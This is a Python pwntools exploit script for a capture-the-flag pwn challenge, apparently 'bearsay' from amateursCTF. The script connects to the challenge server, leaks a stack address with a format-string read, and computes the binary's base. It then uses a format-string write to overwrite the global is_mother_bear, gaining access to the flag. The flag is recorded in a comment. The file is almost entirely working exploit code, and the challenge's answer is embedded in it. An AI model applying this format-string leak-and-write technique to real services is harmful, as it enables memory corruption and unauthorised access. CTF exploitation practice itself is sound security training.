#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

REMOTE_NC_CMD    = "nc chal.amt.rs 1338"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *box+188
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline(b"%15$p")
    r.recvuntil(b"* ")
    leak = int(r.recvline()[:-3], 16)
    
    exe.address = leak - (exe.sym.main+702)

    payload = fmtstr_payload(22, {exe.sym.is_mother_bear:0xbad0bad})

    r.sendline(payload)

    r.sendline(b"flag")

    r.interactive()
    #amateursCTF{bearsay_mooooooooooooooooooo?}

if __name__ == "__main__":
    main()